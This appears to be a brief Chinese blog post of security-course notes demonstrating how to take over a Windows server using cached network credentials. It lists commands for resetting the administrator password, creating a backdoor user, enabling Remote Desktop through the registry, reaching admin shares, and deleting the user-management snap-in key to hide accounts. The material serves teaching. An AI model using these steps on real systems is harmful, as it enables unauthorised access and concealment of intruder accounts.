你好,Hexo

  1. 信息安全
    演示: 使用缓存的网络凭据 入侵一个服务器

    查看计算机名称   hostname
更改用户密码   net user administrator  a1!
创建用户          net user  hanligan  a1!  /add
查看缓存的凭证   net  use
删除缓存的凭证   net  use   \\sql1  /del

    使用缓存的网络凭据可以干什么

    1.   管理远程计算机上的服务
2.   远程更改注册表  开启远程桌面    regedit
3.  管理远程计算机   添加用户  加入管理员组

    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server下的fDenyTSConnections（dword类型）值设为0

    访问默认共享   \\sql1\c$

    删除用户和组的管理单元

    reg  delete  "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MMC\SnapIns\{5D6179C8-17EC-11D1-9AA9-00C04FD8FE93}"  /f

    添加用户和组的管理单元

    reg  add  "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MMC\SnapIns\{5D6179C8-17EC-11D1-9AA9-00C04FD8FE93}"  /f

    远程重启 shutdown -m \sql1 -r
